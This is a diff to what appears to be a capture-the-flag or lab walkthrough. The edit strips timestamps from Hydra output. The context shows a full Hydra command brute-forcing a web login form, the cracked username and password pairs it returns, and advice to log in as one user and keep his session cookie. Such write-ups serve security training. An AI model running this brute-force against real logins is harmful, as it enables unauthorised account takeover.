@@ -398,7 +398,7 @@ Use all of this information in `hydra` to brute-force the passwords for the disc
 root@ip-ATTACKER_IP:~# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form '/index.php:username=^USER^&password=^PASS^:F=Invalid credentials' -t 16
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-09 12:38:39
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 114755184 login tries (l:8/p:14344398), ~7172199 tries per task
 [DATA] attacking http-post-form://TARGET_IP:80/index.php:username=^USER^&password=^PASS^:F=Invalid credentials
 [STATUS] 4503.00 tries/min, 4503 tries in 00:01h, 114750681 to do in 424:44h, 16 active
@@ -414,7 +414,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-09 12:38:
 [80][http-post-form] host: TARGET_IP   login: robert.wilson   password: password
 [80][http-post-form] host: TARGET_IP   login: sarah.johnson   password: password
 1 of 1 target successfully completed, 8 valid passwords found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-09 12:54:07
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 
 ```
 
 Ignoring false-positives from empty password attempts, `username=emma.taylor&password=password` (Product Manager), `username=robert.wilson&password=password` (DevOps Engineer), and `username=sarah.johnson&password=password` (Senior Software Engineer) are all valid credential pairs. Based off of their roles, the latter two are more likely to possess elevated privileges. Try logging in as `robert.wilson` and make sure to save his session cookie.
